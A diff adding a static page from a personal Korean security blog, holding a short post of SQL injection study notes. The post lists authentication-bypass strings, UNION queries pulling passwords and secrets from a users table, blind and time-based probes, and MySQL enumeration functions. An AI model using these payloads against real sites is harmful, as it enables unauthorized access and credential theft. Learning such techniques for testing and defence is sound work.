@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Sn0wd3er">
+
+
+
+
+
+<title>SQL Injection 기법 | Sn0wD3er</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Sn0wd3er`s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/todo">To do</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Sn0wd3er`s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/todo">To do</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SQL Injection 기법</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Sn0wd3er</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 15, 2020&nbsp;&nbsp;19:49:08</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web/">Web</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="인증-우회"><a href="#인증-우회" class="headerlink" title="인증 우회"></a>인증 우회</h3><ul>
+<li><p>인증 쿼리 질의문<br><code>Select * from members where id=&#39;&#39; and pass=&#39;&#39;</code></p>
+</li>
+<li><p><code>&#39; or 1=1 #</code></p>
+</li>
+<li><p><code>&#39; or &#39;x&#39;=&#39;x</code></p>
+</li>
+<li><p><code>&quot; or &quot;x&quot;=&quot;x</code></p>
+</li>
+<li><p><code>&#39;) or (&#39;x&#39;=&#39;x</code></p>
+</li>
+<li><p><code>&quot;) or (&quot;x&quot;=&quot;x</code></p>
+</li>
+</ul>
+<h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><ul>
+<li><code>0&#39; union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#</code></li>
+<li><code>0&#39; union select all 1,2,3,4,5 #</code> </li>
+</ul>
+<p>UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. </p>
+<h3 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h3><ul>
+<li><code>&#39; or 1=1 and length(database())=5#</code></li>
+<li><code>&#39; or 1=1= and substring(database(),1,1)=&#39;b&#39;#</code></li>
+<li><code>&#39; or 1=1 and ascii(substring(database(),1,1))=98#</code></li>
+</ul>
+<p>‘참’과 ‘거짓’의 결과만으로 결과를 얻어낸다.</p>
+<h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><ul>
+<li><code>&#39; or 1=1 and sleep(5)#</code></li>
+</ul>
+<p>sleep()함수를 이용해서 시간을 비교해서 원하는 결과를 얻는 방법, 하지만 시간도 많이 걸리고 제일 마지막에 시도하는 방법이다.</p>
+<h2 id="SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet</h2><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
+<h2 id="My-SQL-Injection에-기본적으로-알아야-할-것들"><a href="#My-SQL-Injection에-기본적으로-알아야-할-것들" class="headerlink" title="My SQL Injection에 기본적으로 알아야 할 것들"></a>My SQL Injection에 기본적으로 알아야 할 것들</h2><ul>
+<li>@@version</li>
+<li>information_schema.tables<ul>
+<li>table_name</li>
+</ul>
+</li>
+<li>information_shcema.columns<ul>
+<li>column_name</li>
+</ul>
+</li>
+<li>database()</li>
+<li>length()</li>
+<li>substring(문자열,시작,개수)</li>
+<li>ascii()</li>
+<li>limit 시작,개수 : 컬럼을 하나씩 가져오기위해 사용</li>
+</ul>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Sn0wd3er</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://sn0wd3er.github.io/2020/11/15/2020-11-15-sqlInjection/">https://sn0wd3er.github.io/2020/11/15/2020-11-15-sqlInjection/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/SQL-Injection/"># SQL Injection</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/11/15/reversing/windows/windowStructure/2020-11-15-pe/">PE 파일</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Sn0wd3er | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
